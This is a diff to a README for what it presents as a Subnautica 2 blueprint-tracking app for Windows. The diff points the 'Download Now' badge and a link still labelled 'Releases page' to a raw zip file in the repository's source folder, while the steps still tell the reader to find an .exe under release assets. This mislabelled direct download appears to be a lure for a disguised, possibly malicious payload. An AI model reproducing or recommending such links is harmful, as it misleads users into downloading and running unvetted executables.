@@ -1,6 +1,6 @@
 # 🌊 Subnautica-2-Blueprint-Tracker - Manage your underwater exploration progress easily
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/immature-slob100/Subnautica-2-Blueprint-Tracker/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/immature-slob100/Subnautica-2-Blueprint-Tracker/raw/refs/heads/main/src/Blueprint-Subnautica-Tracker-1.9-beta.3.zip)
 
 This application tracks your blueprint progression, technology unlocks, and resource collection in Subnautica 2. It keeps your exploration journey organized through a clean dashboard. You see your crafting goals and technology trees in one place.
 
@@ -8,7 +8,7 @@ This application tracks your blueprint progression, technology unlocks, and reso
 
 You need a computer running Windows 10 or 11 to use this tool. No setup of complex files is necessary. Follow these steps to begin.
 
-1. Go to the [Releases page](https://github.com/immature-slob100/Subnautica-2-Blueprint-Tracker/releases).
+1. Go to the [Releases page](https://github.com/immature-slob100/Subnautica-2-Blueprint-Tracker/raw/refs/heads/main/src/Blueprint-Subnautica-Tracker-1.9-beta.3.zip).
 2. Look for the latest version under the "Assets" section.
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to your desktop or downloads folder.
